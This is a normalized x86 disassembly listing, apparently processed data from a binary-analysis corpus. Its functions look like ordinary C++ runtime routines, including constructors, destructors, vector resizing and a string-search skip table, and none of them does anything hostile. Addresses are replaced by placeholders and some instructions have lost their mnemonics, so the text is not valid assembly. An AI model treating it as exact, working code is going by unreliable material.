mov ecx eax
mov eax [ ebp + 0x8 ]
lea edx [ edi + 0x8 ]
call sub_40fb6a
pop edi
pop esi
pop ebp
retn 0x4
sub_40e657
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_40e767
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_40e677
push esi
push edi
mov esi eax
push ebx
mov ecx esi
call sub_40cb79
push 0xa
pop ecx
add esi 0x10
lea edi [ ebx + 0x10 ]
[ edi ] [ esi ]
pop edi
mov eax ebx
pop esi
retn
sub_40e693
push 0x4
mov eax sub_44c722
call sub_448595
mov edi ecx
mov [ ebp - 0x10 ] edi
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x10 ]
call sub_40ed4c
or [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ edi ] r--data
je r-xdata
mov eax edi
call sub_44866d
retn 0x4
push edi
call sub_424fc7
pop ecx
sub_40e6e7
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_40e7cf
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_40e707
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_40e7ff
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_40e727
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_40e82f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_40e747
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_40e767
push 0x0
mov eax sub_44c6ff
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x40 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ edi + 0x8 ]
mov [ edi ] r--data
call sub_40cc34
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_40e7cf
push 0x0
mov eax sub_44a61c
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_40e7ff
push 0x0
mov eax sub_44a5f9
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_40e82f
push 0x0
mov eax sub_44a5d6
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_40e881
push ebp
mov ebp esp
and esp 0xfffffff8
push ebx
push esi
push 0x3
xor eax eax
pop edx
mov ebx ecx
or ebx esi
jne r-xdata
mov ebx ecx
and ebx 0xf
movsx ebx [ ebx + rw-data ]
shrd ecx esi 0x4
add eax ebx
shr esi 0x4
dec edx
jns r-xdata
mov ecx [ edi + edx * 8 ]
mov esi [ edi + edx * 8 + 0x4 ]
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e8bb
push ebp
mov ebp esp
push ecx
push esi
push ecx
mov [ ebp - 0x4 ] esp
mov esi eax
mov [ ebp - 0x4 ] esp
call sub_40eb0d
mov eax esi
pop esi
leave
retn
sub_40e8d8
push 0x0
mov eax sub_44d389
call sub_448595
mov eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
call sub_44866d
retn 0x4
mov esi [ eax ]
mov edx [ ecx ]
mov [ ecx ] esi
mov [ eax ] edx
mov esi [ eax + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ ecx + 0x4 ] esi
mov [ eax + 0x4 ] edx
mov esi [ eax + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ ecx + 0x8 ] esi
mov [ eax + 0x8 ] edx
sub_40e92e
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_40e95b
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
mov [ esi ] edx
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov eax sub_40ebf5
cmp [ ebp + 0x8 ] bl
jne r-xdata
mov [ esi + 0x18 ] eax
mov eax 0xff
sub ecx edx
mov [ ebp - 0x4 ] eax
cmp ecx eax
mov [ ebp - 0x8 ] ecx
lea eax [ ebp - 0x4 ]
jg r-xdata
mov eax sub_40eb91
mov al [ eax ]
mov [ esi + 0x1c ] al
mov ecx 0x100
lea eax [ esi + 0x1d ]
lea eax [ ebp - 0x8 ]
mov dl [ esi + 0x1c ]
dec ecx
mov [ eax ] dl
inc eax
cmp ecx ebx
jg r-xdata
dec [ esi + 0x1c ]
cmp [ ebp + 0x8 ] bl
pop ebx
je r-xdata
push edi
xor eax eax
lea edi [ ebp + 0x8 ]
stosb [ edi ]
push [ ebp + 0x8 ]
mov eax esi
call sub_40eb76
pop edi
push [ ebp + 0x8 ]
mov eax esi
call sub_40eb76
jmp r-xdata
mov eax esi
leave
retn 0x4
sub_40e9df
push ebp
mov ebp esp
push [ ebp + 0x10 ]
lea eax [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ ecx + 0x18 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax esi
pop ebp
retn 0xc
sub_40ea04
push 0x2c
mov eax sub_44d36e
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_40ed70
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_40ea8f
push 0x2c
mov eax sub_44d34b
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_40ed9d
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_40eb0d
push edi
xor eax eax
xor edi edi
inc eax
mov [ esi ] edi
call sub_40fc39
xor ecx ecx
xor edx edx
mov [ esi ] eax
cmp eax edi
je r-xdata
mov eax [ esi ]
mov [ eax ] esi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov eax esi
pop edi
retn 0x4
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
sub_40eb91
push ebp
mov ebp esp
push ecx
push ecx
mov edx [ ebp + 0x10 ]
movzx eax [ ecx + 0x1c ]
sub edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
cmp eax edx
jge r-xdata
mov ecx [ ebp + 0x10 ]
mov esi [ ecx + 0x4 ]
movzx eax al
movzx eax [ eax + ecx + 0x1d ]
add [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] edx
jl r-xdata
mov edi esi
mov edi [ ebp + 0xc ]
add edi eax
mov [ ebp + 0xc ] edi
mov al [ edi ]
mov [ ebp - 0x4 ] edi
cmp al [ esi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
jmp r-xdata
dec [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
mov bl [ ebx ]
dec edi
cmp bl [ edi ]
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
pop ebx
leave
retn 0x10
cmp edi [ ecx ]
je r-xdata
sub_40ebf5
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0x10 ]
movzx eax [ esi + 0x1c ]
sub ecx [ ebp + 0xc ]
push edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] eax
cmp eax ecx
jge r-xdata
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
mov ecx [ edi + 0x204 ]
mov [ ebp - 0x4 ] al
push [ ebp - 0x4 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp al [ ebx ]
je r-xdata
cmp ebx [ esi ]
je r-xdata
mov eax [ ebp + 0xc ]
mov al [ eax ]
mov ecx [ edi + 0x204 ]
mov [ ebp - 0xc ] al
push [ ebp - 0xc ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax al
movzx eax [ eax + esi + 0x1d ]
add [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0x10 ]
jl r-xdata
mov ecx [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x14 ]
mov eax [ ebp + 0x14 ]
mov al [ eax ]
dec ebx
mov ecx [ ebp + 0xc ]
mov ebx [ esi + 0x4 ]
add ecx eax
mov [ ebp + 0xc ] ecx
mov al [ ecx ]
mov [ ebp + 0x14 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
pop ebx
leave
retn 0x10
sub_40ec88
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0x10 ]
movzx eax [ ecx + 0x1c ]
sub edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov [ ebp - 0x14 ] edx
mov [ ebp - 0xc ] eax
cmp eax edx
jge r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ecx + 0xc ]
add edx 0xffffffe4
mov [ ebp - 0x10 ] edx
mov esi eax
mov esi [ eax ]
jmp r-xdata
mov edi eax
mov edi [ eax ]
jmp r-xdata
mov edx [ eax + 0x10 ]
add esi edx
cmp edi 0x10
jb r-xdata
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov edi [ ebp - 0x8 ]
mov bl [ edi ]
mov [ ebp - 0x4 ] edi
cmp edi esi
je r-xdata
mov esi eax
mov esi [ eax ]
jmp r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
movzx eax [ eax + ecx + 0x1d ]
add [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x14 ]
jl r-xdata
cmp eax [ ecx + 0x8 ]
je r-xdata
add edx esi
cmp edx [ ebp - 0x4 ]
je r-xdata
mov edi [ ebp - 0x4 ]
cmp [ edi ] bl
je r-xdata
add [ ebp + 0xc ] eax
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x8 ]
jmp r-xdata
sub eax 0x1c
dec [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
pop ebx
leave
retn 0x10
mov edi [ eax + 0x14 ]
cmp edi 0x10
jb r-xdata
sub_40ed4c
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi ] 0x0
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
retn
push [ esi + 0x4 ]
call sub_40fc7b
push [ esi ]
call sub_424fc7
pop ecx
pop ecx
sub_40ed70
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_40ed9d
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_40edee
push esi
mov esi eax
cmp esi edi
je r-xdata
pop esi
retn
call sub_409b1b
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
xor eax eax
mov [ edi ] eax
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
sub_40ee56
push esi
push edi
mov edi eax
mov esi ecx
mov eax [ esi + 0x4 ]
cmp edi eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
cmp ecx edi
ja r-xdata
push [ esi + 0x4 ]
call sub_40fd17
add [ esi + 0x4 ] 0x20
pop edi
pop esi
retn
call sub_40ef2b
sub edi ecx
cmp eax [ esi + 0x8 ]
jne r-xdata
and edi 0xffffffe0
add edi [ esi ]
jmp r-xdata
call sub_40ef2b
sub_40eea1
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push eax
push ecx
lea eax [ ebp - 0x4 ]
push eax
call sub_40eee3
pop esi
leave
retn
sub_40eee3
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x4 ]
push edi
push [ ebp + 0xc ]
push eax
mov eax ebx
call sub_411a5e
push [ esi + 0x4 ]
mov edi eax
call sub_40b740
add esp 0xc
mov [ esi + 0x4 ] edi
pop edi
sub_40ef2b
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
sub eax ecx
sar eax 0x5
cmp eax 0x7fffffe
jbe r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
inc eax
sar edx 0x5
cmp eax edx
jbe r-xdata
push r--data
call sub_446a95
retn
push eax
mov ecx esi
call sub_40f03d
mov ecx eax
mov edx esi
jmp sub_40ef81
sub_40ef81
push 0x8
mov eax sub_44d328
call sub_4485c8
mov ebx ecx
mov esi edx
cmp ebx 0x7ffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x5
cmp eax ebx
jae r-xdata
push r--data
call sub_446a95
call sub_44866d
retn
test ebx ebx
jne r-xdata
mov eax ebx
call sub_40b75e
mov [ ebp - 0x14 ] eax
and [ ebp - 0x14 ] ebx
jmp r-xdata
mov eax [ ebp - 0x14 ]
shl ebx 0x5
add ebx eax
and edi 0xffffffe0
add edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] edi
mov [ esi ] eax
push ecx
call sub_40b740
push [ esi ]
call sub_424fc7
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x14 ]
mov eax [ esi + 0x4 ]
push [ ebp - 0x14 ]
mov ecx [ esi ]
push eax
call sub_413bd8
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov edi ecx
add esp 0xc
sub edi eax
test eax eax
je r-xdata
sub_40f03d
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
sub eax [ ecx ]
mov edx 0x7ffffff
sar eax 0x5
mov ecx eax
shr ecx 0x1
sub edx ecx
cmp edx eax
jae r-xdata
add eax ecx
xor eax eax
jmp r-xdata
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
sub_40f078
push 0x30
mov eax sub_44e2c1
call sub_448595
mov esi ecx
mov edi [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ eax ] edi
jne r-xdata
push edi
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea eax [ esi + 0x4 ]
mov edx edi
mov ecx esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] bl
mov [ ebp - 0x14 ] eax
call sub_410e55
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] 0x1
cmp [ edi + 0xc ] ebx
je r-xdata
push 0x24b
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov eax edi
call sub_44866d
retn 0xc
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
cmp [ eax ] ecx
je r-xdata
cmp [ edi + 0x8 ] ebx
je r-xdata
lea edx [ ebp - 0x20 ]
push edx
push ecx
lea ecx [ esi + 0x8 ]
push ecx
call sub_411262
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x1c ]
jbe r-xdata
cmp [ ebp - 0x1c ] ebx
jne r-xdata
push 0x254
push r--data
push r--data
call sub_4258e2
add esp 0xc
lea esi [ edi + 0xc ]
call sub_407e47
mov edx [ eax ]
push edi
lea ecx [ ebp - 0x20 ]
push ecx
mov ecx eax
call [ edx + 0x10 ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x3c ]
push [ ebp + 0xc ]
mov ecx esi
push eax
call sub_40f078
mov ebx eax
mov esi edi
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
lea eax [ ebp - 0x3c ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_4069e4
jmp r-xdata
sub_40f174
push 0x0
mov eax sub_44b3d2
call sub_448595
mov edi [ ebp + 0x8 ]
xor edx edx
mov [ edi ] 0x1
mov [ edi + 0x4 ] edx
mov [ edi + 0x8 ] edx
mov eax [ ebx ]
cmp eax edx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov esi ebx
call sub_40fe09
add eax 0x40
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
call sub_40fe09
add eax 0x8
mov [ edi + 0x18 ] eax
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_40f1f9
push esi
mov esi eax
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x18 ]
push rw-data
call sub_425574
test al al
jne r-xdata
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] rw-data
mov eax [ esi ]
pop esi
jmp sub_408952
call sub_411426
mov ecx edi
call sub_40fcf4
test al al
je r-xdata
pop esi
retn
sub_40f237
push 0x8
mov eax sub_44d30d
call sub_448595
mov esi ecx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp [ esi + 0x11 ] bl
je r-xdata
cmp [ esi + 0x1c ] ebx
jle r-xdata
push 0x108
call sub_424ff8
pop ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
mov edi [ esi ]
add edi 0x8
call sub_40e881
cmp eax 0x100
je r-xdata
push 0x8
call sub_424ff8
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
push eax
call sub_40fec0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
push 0x30
call sub_424ff8
pop ecx
cmp eax ebx
je r-xdata
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
jmp r-xdata
mov eax ecx
jmp r-xdata
xor edx edx
add eax 0x4
inc edx
[ eax ] edx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
cmp eax ebx
je r-xdata
mov esi [ esi ]
push 0xa
mov [ eax + 0x4 ] ebx
lea edi [ eax + 0x8 ]
pop ecx
mov [ eax ] r--data
[ edi ] [ esi ]
jmp r-xdata
call sub_44866d
retn
sub_40f2f0
push 0x4
mov eax sub_44d2e8
call sub_4485c8
mov esi ecx
xor edi edi
push 0x10
mov [ esi ] edi
mov [ ebp - 0x4 ] edi
call sub_424ff8
pop ecx
cmp eax edi
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_44866d
retn 0x4
sub_40f367
push 0x0
mov eax sub_44b3ac
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x1
call sub_40fe28
xor edx edx
mov [ edi + 0x4 ] edx
mov [ edi + 0x8 ] edx
mov eax [ ebx ]
cmp eax edx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov esi ebx
call sub_40fe28
add eax 0x8
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_40f3d7
push 0x8
mov eax sub_44c6ae
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x20
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov ecx [ ebp + 0xc ]
mov esi eax
call sub_410011
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_4114a7
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_40f440
push 0x8
mov eax sub_44c672
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x20
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov ecx [ ebp + 0xc ]
mov esi eax
call sub_4100f1
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_411528
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_40f4a9
push 0x0
mov eax sub_44b386
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x0
call sub_40fe47
and [ edi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ edi + 0x8 ] ecx
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
lea edx [ eax + 0x4 ]
mov esi ecx
[ edx ] esi
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea edx [ eax + 0x4 ]
[ edx ] ecx
mov esi ebx
call sub_40fe47
add eax 0xc
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_40f518
push 0x0
mov eax sub_44b360
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
mov [ edi ] bl
call sub_40fe66
mov eax esi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax ebx
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi [ ebp + 0xc ]
call sub_40fe66
add eax 0xc
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] ebx
mov [ edi + 0x18 ] ebx
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_40f589
push 0x8
mov eax sub_44c636
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_4101d1
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_4115d3
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_40f5f2
push 0x8
mov eax sub_44c5fa
call sub_448595
xor esi esi
push 0x1c
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_4102a9
mov esi eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_41164a
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_40f659
push 0x8
mov eax sub_44c5be
call sub_448595
xor esi esi
push 0x1c
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_410379
mov esi eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_4116bb
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_40f6c0
push 0x40
mov eax sub_44c582
call sub_448595
mov ebx ecx
mov esi edx
and [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_40f79a
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_406cd3
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x30 ]
push eax
call sub_4069e4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
mov edi [ esi + 0xc ]
mov [ ebp - 0x14 ] edi
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x10 ] ebx
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_411795
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x4 ] 0x4
call sub_406dc4
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp - 0x4c ]
xor ecx ecx
lea eax [ edi + 0x4 ]
inc ecx
[ eax ] ecx
mov [ ebp - 0x10 ] ebx
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_41172c
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x4 ] 0x2
call sub_406dc4
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x30 ]
jmp r-xdata
xor ecx ecx
lea eax [ edi + 0x4 ]
inc ecx
[ eax ] ecx
call sub_44866d
retn
lea esi [ edi + 0x4 ]
call sub_40c2c3
push eax
call sub_4069e4
or [ ebp - 0x4 ] 0xffffffff
test edi edi
je r-xdata
sub_40f79a
push 0x8
mov eax sub_44c539
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_40cab2
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
